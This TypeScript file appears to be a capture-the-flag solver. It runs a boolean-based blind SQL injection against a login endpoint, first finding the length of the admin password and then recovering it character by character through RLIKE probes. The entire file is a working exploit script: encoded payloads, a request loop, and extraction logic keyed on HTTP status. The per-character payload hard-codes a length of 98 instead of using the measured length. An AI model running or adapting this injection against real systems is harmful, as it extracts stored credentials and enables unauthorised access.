import fetch from 'node-fetch';

const url = 'https://ctf.jappl.es/login';

function lengthSQLInjection(minLen: number, maxLen: number) {
  const query = `" OR EXISTS(SELECT * FROM users WHERE username="admin" AND password RLIKE "^flag\\\\{[a-z0-9_]{${minLen},${maxLen}}\\\\}$") AND ""="`;
  const queryEncoded = encodeURIComponent(query);
  return `username=admin&password=${queryEncoded}`;
}

function characterAtSQLInjection(char: string, index: number) {
  const query = `" OR EXISTS(SELECT * FROM users WHERE username="admin" AND password RLIKE "^flag\\\\{${
    index > 0 ? `[a-z0-9_]{0,${index}}` : ''
  }${char}${
    98 - index > 0 ? `[a-z0-9_]{${98 - (1 + index)}}` : ''
  }\\\\}$") AND ""="`;
  const queryEncoded = encodeURIComponent(query);
  return `username=admin&password=${queryEncoded}`;
}

async function checkIndex(index: number) {
  const alphabet = 'abcdefghijklmnopqrstuvwxyz0123456789_';
  let found = null;

  for (let i = 0; i < alphabet.length; i++) {
    console.log(`Checking index ${index} with character ${alphabet[i]}`);
    const query = characterAtSQLInjection(alphabet[i], index);
    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
      },
      body: query
    });
    if (response.status === 200) {
      console.log(`Found character ${alphabet[i]} at index ${index}`);
      found = alphabet[i];
      break;
    }
  }
  if (!found) {
    console.log(`Could not find character at index ${index}`);
  }
  return found;
}

async function checkLength(maxLength: number) {
  let lengthFound = null;
  for (let i = 1; i <= maxLength; i++) {
    console.log(`Checking length ${i}`);
    const body = lengthSQLInjection(1, i);
    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
      },
      body
    });
    if (response.status === 200) {
      lengthFound = i;
      console.log(`Length: ${i} characters!`);
      break;
    } else {
      console.log(`Longer than ${i} characters`);
    }
  }
  if (!lengthFound) {
    console.log(`Password is longer than ${maxLength} characters.`);
  }
  return lengthFound;
}

async function constructPassword() {
  let length = await checkLength(1000);
  let password = '';
  for (let i = 0; i < length; i++) {
    const char = await checkIndex(i);
    if (char) {
      password += char;
    } else {
      break;
    }
  }
  console.log(`Password: flag{${password}}`);
}

constructPassword();
